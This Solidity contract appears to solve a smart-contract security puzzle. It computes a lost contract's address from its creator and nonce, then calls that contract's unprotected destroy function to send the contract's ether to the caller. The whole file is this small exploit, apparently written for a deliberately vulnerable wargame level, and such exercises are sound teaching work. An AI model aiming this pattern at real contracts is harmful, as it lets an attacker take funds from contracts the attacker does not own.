// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IRecovery {
    function destroy(address payable _to) external;
}


contract Recoverycontract {
    function cal_contract_address(address _from, uint256 nonce) external pure returns(address) {
        address target = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _from, bytes1(uint8(nonce)))))));
        return target;
    }

    function recovery(address _target) public {
        IRecovery(_target).destroy(payable(msg.sender));
    }
}